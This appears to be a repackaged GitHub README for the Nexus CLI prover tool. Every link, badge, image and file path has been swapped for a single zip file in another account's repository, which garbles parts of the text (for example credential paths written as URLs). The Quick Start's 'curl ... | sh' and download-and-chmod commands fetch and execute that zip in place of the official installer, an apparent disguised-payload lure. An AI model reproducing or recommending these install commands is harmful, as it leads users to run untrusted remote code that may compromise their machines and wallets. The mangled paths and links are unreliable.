[![Release](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
[![CI](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
[![License](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
[![License](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
[![Twitter](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
[![Discord](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)

# Nexus CLI

A high-performance command-line interface for contributing proofs to the Nexus network.

<figure>
    <a href="https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip">
        <img src="https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip" alt="Nexus Network visualization showing a distributed network of interconnected nodes with a 'Launch Network' button in the center">
    </a>
    <figcaption>
        <strong>Verifiable Computation on a Global Scale</strong><br>
        We're building a global distributed prover network to unite the world's computers and power a new and better Internet: the Verifiable Internet. Connect to the beta and give it a try today.
    </figcaption>
</figure>

## Nexus Network

[Nexus](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip) is a global distributed prover network that unites the world's computers to power a new and
better Internet: the Verifiable Internet.

There have been several testnets so far:

- Testnet 0: [October 8 – 28, 2024](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
- Testnet I: [December 9 – 13, 2024](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
- Testnet II: [February 18 – 22, 2025](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
- Devnet: [February 22 - June 20, 2025](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
- Testnet III: [Ongoing](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)

---

## Quick Start

### Installation

#### Precompiled Binary (Recommended)

For the simplest and most reliable installation:

```bash
curl https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip | sh
```

This will:
1. Download and install the latest precompiled binary for your platform.
2. Prompt you to accept the Terms of Use.
3. Start the CLI in interactive mode.

The template installation script is viewable [here](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip).

#### Non-Interactive Installation

For automated installations (e.g., in CI):

```bash
curl -sSf https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip -o https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip
chmod +x https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip
NONINTERACTIVE=1 https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip
```

### Proving

Proving with the CLI is documented [here](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip).

To start with an existing node ID, run:

```bash
nexus-cli start --node-id <your-node-id>
```

Alternatively, you can register your wallet address and create a node ID with the CLI, or at [https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip).

```bash
nexus-cli register-user --wallet-address <your-wallet-address>
nexus-cli register-node
nexus-cli start
```

To run the CLI noninteractively, you can also opt to start it in headless mode.

```bash
nexus-cli start --headless
```

The `register-user` and `register-node` commands will save your credentials to `~https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip`. To clear credentials, run:

```bash
nexus-cli logout
```

For troubleshooting or to see available command-line options, run:

```bash
nexus-cli --help
```

### Use Docker
Make sure Docker and Docker Compose have been installed on your machine. Check documentation here:
- [Install Docker](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
- [Install Docker Compose](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)

Then, modify the node ID in the `https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip` file, run:

```bash
docker compose build --no-cache
docker compose up -d
```

Check log

```bash
docker compose logs
```

If you want to shut down, run:

```bash
docker compose down
```

---

## Terms of Use

Use of the CLI is subject to the [Terms of Use](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip).
First-time users running interactively will be prompted to accept these terms.

---

## Node ID

During the CLI's startup, you'll be asked for your node ID. To skip prompts in a
non-interactive environment, manually create a `~https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip` in the
following format:

```json
{
   "node_id": "<YOUR NODE ID>"
}
```

---

## Get Help

- [Network FAQ](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
- [Discord Community](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
- Technical issues? [Open an issue](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip)
- To submit programs to the network for proving, contact
  [https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip).

---

## Contributing

Interested in contributing to the Nexus Network CLI? Check out our
[Contributor Guide](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip) for:

- Development setup instructions
- How to report issues and submit pull requests
- Our code of conduct and community guidelines
- Tips for working with the codebase

For most users, we recommend using the precompiled binaries as described above.
The contributor guide is intended for those who want to modify or improve the CLI
itself.

### 🛠  Developer Guide

The following steps may be required in order to set up a development environment for contributing to the project:

#### Linux

```bash
sudo apt update
sudo apt upgrade
sudo apt install build-essential pkg-config libssl-dev git-all
sudo apt install protobuf-compiler
```

#### macOS

```bash
# Install using Homebrew
brew install protobuf

# Verify installation
protoc --version
```

#### Windows

[Install WSL](https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip),
then see Linux instructions above.

```bash
# Install using Chocolatey
choco install protobuf
```

### Building ProtoBuf files

To build the ProtoBuf files, run the following command in the `clients/cli` directory:

```bash
cargo build --features build_proto
```

### Creating a Release

To create a release, update the package version in `https://github.com/khn0x-khn0x/nexus-cli/raw/refs/heads/main/clients/cli/examples/src/nexus-cli-3.6.zip`, then create and push a new (annotated) tag, e.g.:

```bash
git tag -a v0.1.2 -m "Release v0.1.2"
git push origin v0.1.2
```

This will trigger the GitHub Actions release workflow that compiles binaries and pushes the Docker image, in
addition to creating release.

**WARNING**: Creating a release through the GitHub UI creates a new release but does **NOT** trigger
the workflow. This leads to a release without a Docker image or binaries, which breaks the installation script.

## License

Nexus CLI is distributed under the terms of both the [MIT License](./LICENSE-MIT) and the [Apache License (Version 2.0)](./LICENSE-APACHE).
